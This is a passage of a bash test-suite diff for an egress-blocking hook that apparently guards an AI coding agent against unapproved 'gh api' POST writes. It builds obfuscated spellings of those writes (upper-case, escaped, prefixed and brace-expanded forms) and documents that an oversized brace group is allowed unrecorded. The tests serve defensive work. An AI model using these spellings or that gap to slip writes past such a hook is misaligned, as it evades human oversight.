+_nh_e="$(/usr/bin/awk 'BEGIN { s = "\303\251"; while (length(s) < 400) s = s s; printf "%s", substr(s, 1, 400) }')"
+_nh_cmds=()
+for _nh_h in "${_nh_x}/gh" "${_nh_x}/GH" "${_nh_x}gh" "GH${_nh_x}" "g\\h${_nh_x}" "${_nh_x}/do" "${_nh_x}/sudo" \
+             "${_nh_x}/timeout" "${_nh_x}timeout" "${_nh_x}/abcdefgh" "/${_nh_x}" "${_nh_x}/" "${_nh_e}/gh" "gh"; do
+  for _nh_p in "" "${_nh_x}/sudo " "${_nh_x}timeout "; do
+    _nh_cmds[${#_nh_cmds[@]}]="${_nh_p}${_nh_h} api -X POST ${E007_W_NO}"
+  done
+done
+# e007_nh_read <sandbox> <locale> <command> — "exit/blocks/warns|last block record|last warn record".
+e007_nh_read() {
+  local b w
+  LC_ALL="$2" e007_d_run "$1" enforce "$(e007_d_bash "$3" "$1")"
+  b=""; w=""
+  [ "$E007_D_BLK" = 0 ] || b="$(e007_d_last "$1/.claude/hooks/block-log.jsonl")"
+  [ "$E007_D_WRN" = 0 ] || w="$(e007_d_last "$1/.claude/hooks/egress-warn-log.jsonl")"
+  E007_NH_V="${E007_D_EXIT}/${E007_D_BLK}/${E007_D_WRN}|${b}|${w}"
+}
+_nh_why=""; _nh_n=0; _nh_d1=0; _nh_d2=0; _nh_ref=0
+if [ "$_nh_cw" = 0000 ]; then
+  for _nh_loc in en_US.UTF-8 C; do
+    for _nh_c in "${_nh_cmds[@]}"; do
+      _nh_n=$(( _nh_n + 1 ))
+      e007_nh_read "$E007_NH_S" "$_nh_loc" "$_nh_c"; _nh_s="$E007_NH_V"
+      e007_nh_read "$E007_NH_B" "$_nh_loc" "$_nh_c"
+      [ "$E007_NH_V" = "$_nh_s" ] || _nh_why="${_nh_why} [${_nh_loc} #${_nh_n}] shipped ${_nh_s%%|*}, before ${E007_NH_V%%|*};"
+      case "$_nh_s" in 2/*) _nh_ref=$(( _nh_ref + 1 )) ;; esac
+      if [ "$_nh_d1" = 0 ]; then e007_nh_read "$E007_NH_M1" "$_nh_loc" "$_nh_c"; [ "$E007_NH_V" = "$_nh_s" ] || _nh_d1=1; fi
+      if [ "$_nh_d2" = 0 ]; then e007_nh_read "$E007_NH_M2" "$_nh_loc" "$_nh_c"; [ "$E007_NH_V" = "$_nh_s" ] || _nh_d2=1; fi
+    done
+  done
+  [ "$_nh_d1" = 1 ] || _nh_why="${_nh_why} the short-tail near miss reads like the shipped hook (the comparison cannot see a difference);"
+  [ "$_nh_d2" = 1 ] || _nh_why="${_nh_why} the wrong-token near miss reads like the shipped hook;"
+  [ "$_nh_ref" -gt 0 ] || _nh_why="${_nh_why} no command was refused, so the set reaches no write;"
+else
+  _nh_why=" the copies could not be built (forced, before, then each near miss: ${_nh_cw}; 0 = built);"
+fi
+if [ -z "$_nh_why" ]; then
+  e007_d_pass "AC-E007-NH-EQ: the walk's two basename reads equal the code before them on ${_nh_n} runs of the whole hook with the phase forced, ${_nh_ref} of them refused, in UTF-8 and C, and two near misses each differ"
+else
+  e007_d_fail "AC-E007-NH-EQ: the walk's two basename reads equal the code before them on the whole hook" "$_nh_why"
+fi
+e007_n_timed "a long upper-case command word" "AC-E007-NH" upper 'GH' 'a' ' api repos/o/r' 'GH' 'a' '/x api repos/o/r'
+e007_n_timed "a long escaped command word" "AC-E007-NH" escaped 'g\h' '\a' ' api repos/o/r' 'g\h' '\a' '/x api repos/o/r'
+e007_n_ctl "AC-E007-NH-CTL" "$E007_NH_B" upper 40 en_US.UTF-8 "the walk's two basename reads"
+
+# ---- AC-E007-NH-LEN (#8315, DT pass 11): the head walk's eight-character stand-in, pinned ----
+#
+# The walk reads a long command word's basename from its last eight characters (the line marked
+# `# linear: head-word`) and tests it against the keyword list and the prefix-word list of the case
+# statement right below that line. Those eight characters stand in for the basename only while every
+# word in the two lists has seven characters or fewer: a basename of eight or more is then read as
+# eight characters that match no listed word, which is what the removal it replaced would find. A
+# listed word of eight characters would match the tail of any longer basename that ends in it, so a
+# long command word that is neither a keyword nor a prefix word would be stepped over as one, and the
+# write behind it read at the wrong position. NH-EQ compares the hook against the code before it on
+# the words the lists hold today, so it cannot see a longer word added later. This arm protects the
+# stand-in's assumption: it reads the two lists from the hook source and fails if any word in them is
+# longer than seven characters. Its sensitivity limb runs the same check on the list with one
+# eight-character word added, which must report that word; and the read must find both lists, so a
+# read that finds nothing cannot pass.
+# e007_hwl_lists <hook source> — the words of the walk's case arms under the head-word line, one a
+# line, each arm opened by a line reading ARM.
+e007_hwl_lists() {
+  /usr/bin/awk '
+    index($0, "# linear: head-word") { seen = 1; next }
+    seen && !open && index($0, "case \"${egress_raw##*/}\" in") { open = 1; match($0, /^ */); ind = RLENGTH; next }
+    open {
+      match($0, /^ */)
+      if (RLENGTH == ind && $0 ~ /^ *esac/) exit
+      if (RLENGTH == ind + 2 && $0 ~ /\)[ \t]*$/) {
+        line = $0; sub(/^ */, "", line); sub(/\)[ \t]*$/, "", line)
+        if (line == "*") next
+        print "ARM"
+        n = split(line, w, "|")
+        for (i = 1; i <= n; i++) { gsub(/\047/, "", w[i]); print w[i] }
+      }
+    }
+  ' "$1"
+}
+# e007_hwl_long <words, one a line> — each word longer than seven characters, followed by a blank.
+e007_hwl_long() { /usr/bin/awk '$0 != "ARM" && length($0) > 7 { printf "%s ", $0 }' <<<"$1"; }
+_hwl_all="$(e007_hwl_lists "${E007_D_HOOK_SRC}/block-egress.sh")"
+_hwl_arms="$(/usr/bin/awk '$0 == "ARM" { n++ } END { print n + 0 }' <<<"$_hwl_all")"
+_hwl_n="$(/usr/bin/awk '$0 != "ARM" && $0 != "" { n++ } END { print n + 0 }' <<<"$_hwl_all")"
+_hwl_over="$(e007_hwl_long "$_hwl_all")"
+_hwl_ctl="$(e007_hwl_long "${_hwl_all}
+abcdefgh")"
+_hwl_why=""
+[ "$_hwl_arms" -ge 2 ] || _hwl_why="${_hwl_why} the walk's keyword and prefix lists were not found under the head-word line (${_hwl_arms} found);"
+[ -z "$_hwl_over" ] || _hwl_why="${_hwl_why} a listed word is longer than seven characters: ${_hwl_over};"
+case " ${_hwl_ctl}" in
+  *" abcdefgh "*) ;;
+  *) _hwl_why="${_hwl_why} sensitivity: the list with an eight-character word added reads [${_hwl_ctl}], without that word;" ;;
+esac
+if [ -z "$_hwl_why" ]; then
+  e007_d_pass "AC-E007-NH-LEN: every word the walk's keyword-and-prefix test compares a long word's last eight characters against has at most seven characters (${_hwl_n} words in ${_hwl_arms} lists, read from the hook source), and the same check on the list with an eight-character word added reports that word"
+else
+  e007_d_fail "AC-E007-NH-LEN: every word the walk's keyword-and-prefix test compares a long word's last eight characters against has at most seven characters" "$_hwl_why"
+fi
+
+# ---- AC-E007-NL*, -NU*, -NG* (#8315, DT pass 9): two more basename tests, and the brace step's bound ----
+#
+# Three more places of the -007 scanner grew faster than the command on bash 3.2. The look-ahead behind a
+# prefix command tested each candidate's basename, in its plain spelling and in a respelling, by removing
+# its longest prefix up to a slash, which retries the match at every position it could end, and the widened
+# fast path hands it a long command word in an upper-case or escaped spelling; the unparseable branch's
+# second reader tested the first word of each piece the same way. Each now tests by egress_base_gh, which
+# matches a long word once. The brace step built every word of a group, each carrying the prefix and the
+# suffix, so a group whose words share a long one expanded to the product of the two; it now computes that
+# size from its split, before any word is built, and past its bound reads the group as written, as the hook
+# before this release read every brace group.
+#
+# NL-EQ and NU-EQ compare the whole hook, with the phase forced, against the copy with the lines as before,
+# on commands that reach each test's long-word branch densely — long words ending in gh with a slash before
+# it and without one, in lower and upper case, escaped and with multibyte letters, behind a prefix word, a
+# passed-over word and an option, or opening a piece of a command the scanner cannot tokenize — in both
+# locales: the same exit and records; and near misses, each one edit of the new line, differ. A look-ahead hit
+# on a word whose basename is not gh is rejected by the verb test after it, so a widened test changes a verdict
+# only where its wrong hit hides a real pair later in the segment: the set carries that decoy — each long word,
+# then api, then a real write. Their timed and CTL arms are AC-E007-N*'s. NG-EQ pins the brace step against the code before it on the dense set and
+# on groups at and around the bound, beside near misses at the bound; NG-AT, NG-PAST and NG-ELSE pin the
+# verdicts: a group at the bound still expands and its write is refused, one a character past it is read as
+# written where the copy without the bound refuses it, and a write elsewhere in the same command is refused.
+
+# -- NL: the look-ahead's two basename tests --
+E007_N_K=0
+_nl_ph='readonly EGRESS_007_WIDENING_PHASE="shadow"'
+_nl_pe='readonly EGRESS_007_WIDENING_PHASE="enforce"'
+_nl_pn='if egress_base_gh "${egress_toks[$egress_sidx]}" && [ "${egress_toks[$(( egress_sidx + 1 ))]}" = "api" ]; then  # linear: look-ahead'
+_nl_po='if [ "${egress_toks[$egress_sidx]##*/}" = "gh" ] && [ "${egress_toks[$(( egress_sidx + 1 ))]}" = "api" ]; then'
+_nl_rn='egress_base_gh "${EGRESS_RV[0]}" || return 1  # linear: look-ahead respelled'
+_nl_ro='[ "${EGRESS_RV[0]##*/}" = gh ] || return 1'
+E007_NL_S="${E007_W_BASE}/nls"; e007_n_copy "$E007_NL_S" "$_nl_ph" "$_nl_pe"; _nl_cw="$E007_N_CW"
+E007_NL_B="${E007_W_BASE}/nlb"; e007_n_copy "$E007_NL_B" "$_nl_ph" "$_nl_pe" "$_nl_pn" "$_nl_po" "$_nl_rn" "$_nl_ro"; _nl_cw="${_nl_cw}${E007_N_CW}"
+E007_NL_M1="${E007_W_BASE}/nlm1"; e007_n_copy "$E007_NL_M1" "$_nl_ph" "$_nl_pe" "$_nl_pn" \
+  'if { case "${egress_toks[$egress_sidx]}" in gh|*gh) true ;; *) false ;; esac; } && [ "${egress_toks[$(( egress_sidx + 1 ))]}" = "api" ]; then'; _nl_cw="${_nl_cw}${E007_N_CW}"
+E007_NL_M2="${E007_W_BASE}/nlm2"; e007_n_copy "$E007_NL_M2" "$_nl_ph" "$_nl_pe" "$_nl_rn" 'case "${EGRESS_RV[0]}" in gh|*gh) ;; *) return 1 ;; esac'; _nl_cw="${_nl_cw}${E007_N_CW}"
+E007_NL_M3="${E007_W_BASE}/nlm3"; e007_n_copy "$E007_NL_M3" "$_nl_ph" "$_nl_pe" "$_nl_pn" \
+  'if egress_base_gh "${egress_toks[$(( egress_sidx + 1 ))]}" && [ "${egress_toks[$(( egress_sidx + 1 ))]}" = "api" ]; then'; _nl_cw="${_nl_cw}${E007_N_CW}"
+_nl_x="$(/usr/bin/awk 'BEGIN { s = "x"; while (length(s) < 300) s = s s; printf "%s", substr(s, 1, 300) }')"
+_nl_u="$(/usr/bin/awk 'BEGIN { s = "X"; while (length(s) < 300) s = s s; printf "%s", substr(s, 1, 300) }')"
+_nl_e="$(/usr/bin/awk 'BEGIN { s = "\303\251"; while (length(s) < 400) s = s s; printf "%s", substr(s, 1, 400) }')"
+_nl_words=( "${_nl_x}/gh" "${_nl_x}/GH" "${_nl_x}gh" "${_nl_u}GH" "GH${_nl_x}" "g\\h${_nl_x}" "${_nl_x}g\\h" "${_nl_x}/g\\h" \
+            "${_nl_e}/gh" "${_nl_e}gh" "${_nl_x}/" "/${_nl_x}" "${_nl_x}/sudo" "${_nl_x}" "gh" "GH" )
+_nl_cmds=()
+for _nl_w in "${_nl_words[@]}"; do
+  for _nl_p in "sudo @ api -X POST ${E007_W_NO}" "sudo x @ api -X POST ${E007_W_NO}" "sudo -E @ api -X POST ${E007_W_NO}" \
+               "env -u X @ api -X POST ${E007_W_NO}" "${_nl_x}/sudo @ api -X POST ${E007_W_NO}" "timeout 5 @ api ${E007_W_NO} -f a=1" \
+               "nice @ api -X POST ${E007_W_OK}" "sudo x @ api y gh api -X POST ${E007_W_NO}" "sudo -E @ api y gh api -X POST ${E007_W_NO}"; do
+    _nl_cmds[${#_nl_cmds[@]}]="${_nl_p%%@*}${_nl_w}${_nl_p#*@}"
+  done
+done
+_nl_why=""; _nl_n=0; _nl_ref=0; _nl_d1=0; _nl_d2=0; _nl_d3=0
+if [ "$_nl_cw" = 00000 ]; then
+  for _nl_loc in en_US.UTF-8 C; do
+    for _nl_c in "${_nl_cmds[@]}"; do
+      _nl_n=$(( _nl_n + 1 ))
+      e007_nh_read "$E007_NL_S" "$_nl_loc" "$_nl_c"; _nl_s="$E007_NH_V"
+      e007_nh_read "$E007_NL_B" "$_nl_loc" "$_nl_c"
+      [ "$E007_NH_V" = "$_nl_s" ] || _nl_why="${_nl_why} [${_nl_loc} #${_nl_n}] shipped ${_nl_s%%|*}, before ${E007_NH_V%%|*};"
+      case "$_nl_s" in 2/*) _nl_ref=$(( _nl_ref + 1 )) ;; esac
+      if [ "$_nl_d1" = 0 ]; then e007_nh_read "$E007_NL_M1" "$_nl_loc" "$_nl_c"; [ "$E007_NH_V" = "$_nl_s" ] || _nl_d1=1; fi
+      if [ "$_nl_d2" = 0 ]; then e007_nh_read "$E007_NL_M2" "$_nl_loc" "$_nl_c"; [ "$E007_NH_V" = "$_nl_s" ] || _nl_d2=1; fi
+      if [ "$_nl_d3" = 0 ]; then e007_nh_read "$E007_NL_M3" "$_nl_loc" "$_nl_c"; [ "$E007_NH_V" = "$_nl_s" ] || _nl_d3=1; fi
+    done
+  done
+  [ "$_nl_d1" = 1 ] || _nl_why="${_nl_why} the widened plain test reads like the shipped hook (the comparison cannot see a difference);"
+  [ "$_nl_d2" = 1 ] || _nl_why="${_nl_why} the widened respelled test reads like the shipped hook;"
+  [ "$_nl_d3" = 1 ] || _nl_why="${_nl_why} the plain test on the wrong token reads like the shipped hook;"
+  [ "$_nl_ref" -gt 0 ] || _nl_why="${_nl_why} no command was refused, so the set reaches no write;"
+else
+  _nl_why=" the copies could not be built (forced, before, then each near miss: ${_nl_cw}; 0 = built);"
+fi
+if [ -z "$_nl_why" ]; then
+  e007_d_pass "AC-E007-NL-EQ: the look-ahead's two basename tests equal the code before them on ${_nl_n} runs of the whole hook with the phase forced, ${_nl_ref} of them refused, in UTF-8 and C, and three near misses each differ"
+else
+  e007_d_fail "AC-E007-NL-EQ: the look-ahead's two basename tests equal the code before them on the whole hook" "$_nl_why"
+fi
+e007_n_timed "a long upper-case command word behind a prefix word" "AC-E007-NL" lafold 'sudo GH' 'a' ' api repos/o/r' 'sudo GH' 'a' '/x api repos/o/r'
+e007_n_timed "a long upper-case command word behind a prefix word's option" "AC-E007-NL" lafoldopt 'sudo -E GH' 'a' ' api repos/o/r' 'sudo -E GH' 'a' '/x api repos/o/r'
+E007_NL_B1="${E007_W_BASE}/nlb1"; e007_n_copy "$E007_NL_B1" "$_nl_pn" "$_nl_po"
+e007_n_ctl "AC-E007-NL-CTL1" "$E007_NL_B1" lafold 80 en_US.UTF-8 "the look-ahead's plain basename test"
+E007_NL_B2="${E007_W_BASE}/nlb2"; e007_n_copy "$E007_NL_B2" "$_nl_rn" "$_nl_ro"
+e007_n_ctl "AC-E007-NL-CTL2" "$E007_NL_B2" lafoldopt 80 en_US.UTF-8 "the look-ahead's respelled basename test"
+
+# -- NU: the unparseable branch's second reader's basename test --
+E007_N_K=0
+_nu_n9='egress_base_gh "${EGRESS_RV[0]}" || return 1  # linear: second reader'
+_nu_o9='[ "${EGRESS_RV[0]##*/}" = gh ] || return 1'
+E007_NU_B="${E007_W_BASE}/nub"; e007_n_copy "$E007_NU_B" "$_nl_ph" "$_nl_pe" "$_nu_n9" "$_nu_o9"; _nu_cw="$E007_N_CW"
+E007_NU_M1="${E007_W_BASE}/num1"; e007_n_copy "$E007_NU_M1" "$_nl_ph" "$_nl_pe" "$_nu_n9" 'case "${EGRESS_RV[0]}" in gh|*gh) ;; *) return 1 ;; esac'; _nu_cw="${_nu_cw}${E007_N_CW}"
+E007_NU_M2="${E007_W_BASE}/num2"; e007_n_copy "$E007_NU_M2" "$_nl_ph" "$_nl_pe" "$_nu_n9" 'egress_base_gh "${egress_toks[0]}" || return 1  # linear: second reader'; _nu_cw="${_nu_cw}${E007_N_CW}"
+_nu_cmds=()
+for _nu_w in "${_nl_words[@]}"; do
+  for _nu_p in "@ api -X POST ${E007_W_NO} '" "echo a; @ api -X POST ${E007_W_NO} '" "echo a | @ api ${E007_W_NO} '" \
+               ">x @ api -X POST ${E007_W_NO} '" "@ api -X POST ${E007_W_NO}${E007_SP_ESQ}" "echo a${E007_SP_NL}@ api -X POST ${E007_W_NO} '"; do
+    _nu_cmds[${#_nu_cmds[@]}]="${_nu_p%%@*}${_nu_w}${_nu_p#*@}"
+  done
+done
+_nu_why=""; _nu_n=0; _nu_ref=0; _nu_d1=0; _nu_d2=0
+if [ "$_nu_cw" = 000 ]; then
+  for _nu_loc in en_US.UTF-8 C; do
+    for _nu_c in "${_nu_cmds[@]}"; do
+      _nu_n=$(( _nu_n + 1 ))
+      e007_nh_read "$E007_NL_S" "$_nu_loc" "$_nu_c"; _nu_s="$E007_NH_V"
+      e007_nh_read "$E007_NU_B" "$_nu_loc" "$_nu_c"
+      [ "$E007_NH_V" = "$_nu_s" ] || _nu_why="${_nu_why} [${_nu_loc} #${_nu_n}] shipped ${_nu_s%%|*}, before ${E007_NH_V%%|*};"
+      case "$_nu_s" in 2/*) _nu_ref=$(( _nu_ref + 1 )) ;; esac
+      if [ "$_nu_d1" = 0 ]; then e007_nh_read "$E007_NU_M1" "$_nu_loc" "$_nu_c"; [ "$E007_NH_V" = "$_nu_s" ] || _nu_d1=1; fi
+      if [ "$_nu_d2" = 0 ]; then e007_nh_read "$E007_NU_M2" "$_nu_loc" "$_nu_c"; [ "$E007_NH_V" = "$_nu_s" ] || _nu_d2=1; fi
+    done
+  done
+  [ "$_nu_d1" = 1 ] || _nu_why="${_nu_why} the widened test reads like the shipped hook (the comparison cannot see a difference);"
+  [ "$_nu_d2" = 1 ] || _nu_why="${_nu_why} the test on the word before its normalization reads like the shipped hook;"
+  [ "$_nu_ref" -gt 0 ] || _nu_why="${_nu_why} no command was refused, so the set reaches no write;"
+else
+  _nu_why=" the copies could not be built (before, then each near miss: ${_nu_cw}; 0 = built);"
+fi
+if [ -z "$_nu_why" ]; then
+  e007_d_pass "AC-E007-NU-EQ: the second reader's basename test equals the code before it on ${_nu_n} runs of the whole hook with the phase forced, ${_nu_ref} of them refused, in UTF-8 and C, and two near misses each differ"
+else
+  e007_d_fail "AC-E007-NU-EQ: the second reader's basename test equals the code before it on the whole hook" "$_nu_why"
+fi
+e007_n_timed "a long upper-case command word in a command the scanner cannot tokenize" "AC-E007-NU" unpfold 'GH' 'a' " api repos/o/r '" 'GH' 'a' "/x api repos/o/r '"
+e007_n_timed "a long escaped command word in a command the scanner cannot tokenize" "AC-E007-NU" unpesc 'g\h' '\a' " api repos/o/r '" 'g\h' '\a' "/x api repos/o/r '"
+E007_NU_B1="${E007_W_BASE}/nub1"; e007_n_copy "$E007_NU_B1" "$_nu_n9" "$_nu_o9"
+e007_n_ctl "AC-E007-NU-CTL" "$E007_NU_B1" unpfold 80 en_US.UTF-8 "the second reader's basename test"
+
+# -- NG: the brace step's bound --
+#
+# The bound is the sum of the lengths of the words a group would build. A group at the bound is built from a
+# write — gh, api, a method flag and its value, and one long attached header value that brings the sum to the
+# bound — so it is refused on day one as its plain spelling is; the same group one character longer is read as
+# written, the one word the shell would not run as gh, as the hook before this release read every brace group.
+E007_N_K=0
+_ng_line='  [ $(( (EGRESS_SPN + 1) * (${#pre} + ${#post}) + ${#mid} - EGRESS_SPN )) -le 65536 ] || return 1  # bound: brace'
+E007_NG_NB="${E007_W_BASE}/ngnb"; e007_n_copy "$E007_NG_NB" "${_ng_line}${E007_SP_NL}" ''; _ng_cw="$E007_N_CW"
+# e007_ng_group <header-length> — {gh,api,-iX,POST,-iH<A x header-length>}: its words sum to 15 + the length.
+e007_ng_group() {
+  /usr/bin/awk -v n="$1" 'BEGIN { s = "A"; while (length(s) < n) s = s s; printf "{gh,api,-iX,POST,-iH%s}", substr(s, 1, n) }'
+}
+_ng_at="$(e007_ng_group 65521)"
+_ng_past="$(e007_ng_group 65522)"
+if [ "$_ng_cw" = 0 ] && [ "${#_ng_at}" = 65542 ] && [ "${#_ng_past}" = 65543 ]; then
+  e007_sp_arm "AC-E007-NG-AT: a brace group whose words sum to the bound and spell an unlisted write is expanded and refused on day one, as its plain spelling is" \
+    "${_ng_at} ${E007_W_NO}" "$E007_W_S" 2 1 0
+  e007_sp_arm "AC-E007-NG-PAST: the same group one character past the bound is read as written, one word, and allowed with no record, where the copy without the bound refuses it" \
+    "${_ng_past} ${E007_W_NO}" "$E007_W_S" 0 0 0 "$E007_NG_NB" 2 1 0
+  e007_sp_arm "AC-E007-NG-ELSE: an unlisted write at the head of a later segment of a command holding the group past the bound is refused on day one" \
+    "${_ng_past} ${E007_W_NO}; gh api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0
+else
+  e007_d_fail "AC-E007-NG-AT/PAST/ELSE: the verdicts at and past the brace step's bound" \
+    "the copy without the bound could not be built (${_ng_cw}; 0 = built) or a group has the wrong length (${#_ng_at}, ${#_ng_past})"
+fi
+# NG-EQ: the brace step against the code before it — on the dense set, and on groups whose words sum to just under,
+# exactly and just past the bound, the prefix, the suffix or the words' own text carrying the length — equal on
+# every group within the bound; past it the step returns 1 and builds nothing, where the code before expanded it.
+/bin/mkdir -p "${E007_N_R}/ng"
+/usr/bin/python3 -c 'import os, sys
+d = sys.argv[1]; B = 65536
+def grp(pre, alts, post):
+    return pre + b"{" + b",".join(alts) + b"}" + post, sum(len(pre) + len(a) + len(post) for a in alts if pre + a + post)
+k = 0
+for delta, tag in ((-1, "in"), (0, "in"), (1, "past")):
+    T = B + delta
+    for kind in ("pre", "post", "both", "alts", "empty", "mixed"):
+        k += 1
+        if kind in ("pre", "post"):
+            n = 64; L = (T - n) // n; alts = [b"b"] * (n - 1) + [b"b" * (T - n * L - (n - 1))]
+            s, t = grp(b"p" * L, alts, b"") if kind == "pre" else grp(b"", alts, b"q" * L)
+        elif kind == "both":
+            h = (T - 2) // 4; s, t = grp(b"p" * h, [b"a", b"a" + b"b" * (T - 2 - 4 * h)], b"q" * h)
+        elif kind == "alts":
+            s, t = grp(b"", [b"gh", b"api", b"z" * (T - 5)], b"")
+        elif kind == "empty":
+            L = T // 256; s, t = grp(b"p" * L, [b""] * 255 + [b"b" * (T - 256 * L)], b"")
+        else:
+            s, t = grp(b"x" * 100, [b"a"] * 200 + [b""] * 50 + [b"c" * (T - 251 * 100 - 200)], b"")
+        assert t == T, (kind, t, T)
+        open(os.path.join(d, "g-%s-%02d-%s" % (tag, k, kind)), "wb").write(s)
+' "${E007_N_R}/ng"
+/bin/cat > "${E007_N_R}/ng-eval.sh" <<'E007_NG_EVAL'
+set -euo pipefail
+readonly EGRESS_SENT=$'\001'
+. "$1"
+exec > "$3"
+for f in "$2"/w-* "$2"/../ng/g-*; do
+  w="$(/bin/cat "$f"; printf x)"; w="${w%x}"
+  st=0; EGRESS_RV=(); EGRESS_RVN=0; EGRESS_RVCH=0; EGRESS_BW=(); egress_brace_words "$w" || st=$?
+  printf '== %s %s %s %s %s\n' "${f##*/}" "$st" "$EGRESS_RVN" "$EGRESS_RVCH" "${#EGRESS_BW[@]}"
+  [ "$st" -ne 0 ] || printf '%s\n' "${EGRESS_RV[@]}"
+done
+E007_NG_EVAL
+/bin/cat > "${E007_N_R}/ng-before.sh" <<'E007_NG_BEFORE'
+egress_brace_words() {
+  local w="$1" pre rest mid post alt k=0
+  case "$w" in *'{'*) ;; *) return 1 ;; esac
+  case "$w" in *\\*|*'$'*|*/*|*..*|*"${EGRESS_SENT}"*) return 1 ;; esac
+  egress_split_at '{' "$w"  # linear: brace
+  [ "$EGRESS_SPN" -eq 1 ] || return 1
+  pre="${EGRESS_SP[0]}"; rest="${EGRESS_SP[1]}"
+  case "$pre" in *'}'*) return 1 ;; esac
+  egress_split_at '}' "$rest"
+  [ "$EGRESS_SPN" -eq 1 ] || return 1
+  mid="${EGRESS_SP[0]}"; post="${EGRESS_SP[1]}"
+  case "$mid" in *,*) ;; *) return 1 ;; esac
+  egress_split_at ',' "$mid"
+  EGRESS_BW=()
+  for alt in "${EGRESS_SP[@]}"; do
+    if [ -n "${pre}${alt}${post}" ]; then
+      EGRESS_BW[$k]="${pre}${alt}${post}"
+      k=$(( k + 1 ))
+    fi
+  done
+  [ "$k" -gt 0 ] || return 1
+  EGRESS_RV=( "${EGRESS_BW[@]}" )
+  EGRESS_RVN="$k"
+  EGRESS_RVCH=1
+  return 0
+}
+E007_NG_BEFORE
+# e007_ng_out <lib> <locale> <out> — the brace step of <lib> over every word and group.
+e007_ng_out() {
+  LC_ALL="$2" /bin/bash "${E007_N_R}/ng-eval.sh" "$1" "${E007_N_R}/in" "$3"
+}
+E007_NG_M1="${E007_W_BASE}/ngm1"; e007_n_copy "$E007_NG_M1" '${#mid} - EGRESS_SPN )) -le 65536 ]' '${#mid} - EGRESS_SPN )) -lt 65536 ]'; _ng_ecw="$E007_N_CW"
+E007_NG_M2="${E007_W_BASE}/ngm2"; e007_n_copy "$E007_NG_M2" '(${#pre} + ${#post})' '(${#pre})'; _ng_ecw="${_ng_ecw}${E007_N_CW}"
+E007_NG_M3="${E007_W_BASE}/ngm3"; e007_n_copy "$E007_NG_M3" '(${#pre} + ${#post})' '(${#post})'; _ng_ecw="${_ng_ecw}${E007_N_CW}"
+_ng_why=""; _ng_k=0; _ng_p=0
+if [ "$_ng_ecw" = 000 ]; then
+  e007_n_lift "$E007_W_SRC" "${E007_N_R}/ng-ship.sh" egress_split_at egress_brace_words
+  { e007_n_lift "$E007_W_SRC" "${E007_N_R}/ng-split.sh" egress_split_at; /bin/cat "${E007_N_R}/ng-split.sh" "${E007_N_R}/ng-before.sh"; } > "${E007_N_R}/ng-old.sh"
+  for _ng_loc in en_US.UTF-8 C; do
+    e007_ng_out "${E007_N_R}/ng-ship.sh" "$_ng_loc" "${E007_N_R}/ng-out-ship" || _ng_why="${_ng_why} [${_ng_loc}] the shipped step did not run;"
+    e007_ng_out "${E007_N_R}/ng-old.sh" "$_ng_loc" "${E007_N_R}/ng-out-old" || _ng_why="${_ng_why} [${_ng_loc}] the code before did not run;"
+    # Within the bound: every record equal. Past it: the shipped step returns 1 with nothing built, the code before 0.
+    _ng_cmp="$(/usr/bin/python3 -c 'import sys
+def recs(p):
+    out = {}; cur = None
+    for line in open(p, "rb").read().split(b"\n"):
+        if line.startswith(b"== "):
+            cur = line.split(b" ")[1]; out[cur] = [line]
+        elif cur is not None:
+            out[cur].append(line)
+    return out
+a, b = recs(sys.argv[1]), recs(sys.argv[2]); bad = 0; past = 0
+for k in a:
+    if k.startswith(b"g-past-"):
+        past += 1
+        if not (a[k][0].split(b" ")[2:] == [b"1", b"0", b"0", b"0"] and b[k][0].split(b" ")[2] == b"0"):
+            bad += 1
+    elif a[k] != b.get(k):
+        bad += 1
+print("%d %d %d" % (len(a), past, bad))' "${E007_N_R}/ng-out-ship" "${E007_N_R}/ng-out-old")"
+    _ng_k="${_ng_cmp%% *}"; _ng_r="${_ng_cmp#* }"; _ng_p="${_ng_r%% *}"
+    [ "${_ng_r#* }" = 0 ] || _ng_why="${_ng_why} [${_ng_loc}] ${_ng_r#* } words differ from the code before where they must not;"
+    for _ng_m in "$E007_NG_M1" "$E007_NG_M2" "$E007_NG_M3"; do
+      e007_n_lift "${_ng_m}/mut.sh" "${E007_N_R}/ng-near.sh" egress_split_at egress_brace_words
+      e007_ng_out "${E007_N_R}/ng-near.sh" "$_ng_loc" "${E007_N_R}/ng-out-near" || true
+      /usr/bin/cmp -s "${E007_N_R}/ng-out-ship" "${E007_N_R}/ng-out-near" \
+        && _ng_why="${_ng_why} [${_ng_loc}] near miss ${_ng_m##*/} reads like the shipped step (the comparison cannot see a difference);"
+    done
+  done
+  [ "$_ng_k" -ge 150 ] && [ "$_ng_p" = 6 ] || _ng_why="${_ng_why} only ${_ng_k} words, ${_ng_p} of them past the bound, were read;"
+else
+  _ng_why=" the near misses could not be built (${_ng_ecw}; 0 = built);"
+fi
+if [ -z "$_ng_why" ]; then
+  e007_d_pass "AC-E007-NG-EQ: the brace step equals the code before it on ${_ng_k} words and groups within its bound in UTF-8 and C, returns 1 and builds nothing on the ${_ng_p} past it, and three near misses at the bound each differ"
+else
+  e007_d_fail "AC-E007-NG-EQ: the brace step equals the code before it within its bound, and reads a group past it as written" "$_ng_why"
+fi
+# e007_ng_timed <label> <arm> <shape> <pre|post> — the ratio arms on a brace group whose words share a long prefix
+# (or suffix), half the command, at 10, 20, 40 and 80 KB in both locales, against its twin, the same command
+# with the group's opening brace an ordinary letter, which the brace step leaves at once.
+e007_ng_timed() {
+  local kb loc
+  for kb in 10 20 40 80; do
+    /usr/bin/awk -v n="$(( kb * 1024 ))" -v k="$4" 'BEGIN { x = "x"; while (length(x) < n / 2) x = x x; x = substr(x, 1, int(n / 2))
+      g = "b,"; while (length(g) < 2 * (int(n / 4) - 4)) g = g g; g = substr(g, 1, 2 * (int(n / 4) - 4)) "c}"
+      if (k == "pre") { s = x "{" g } else { s = "{" g x }
+      printf "%s gh api repos/o/r", s > ARGV[1]; t = s; sub(/\{/, "x", t); printf "%s gh api repos/o/r", t > ARGV[2] }' \
+      "${E007_N_R}/$3-${kb}.cmd" "${E007_N_R}/$3-${kb}.twin"
+    for loc in en_US.UTF-8 C; do
+      E007_N_K=$(( E007_N_K + 1 ))
+      e007_n_ratio "$E007_W_S" "$loc" 3 "${E007_N_R}/$3-${kb}.cmd" "${E007_N_R}/$3-${kb}.twin"
+      if [ "$E007_N_OK" = 1 ]; then
+        e007_d_pass "$2${E007_N_K}: $1 at ${kb} KB in ${loc} costs the whole hook within ${E007_N_BOUND} times its neutral twin, inside the budget, and both are allowed"
+      else
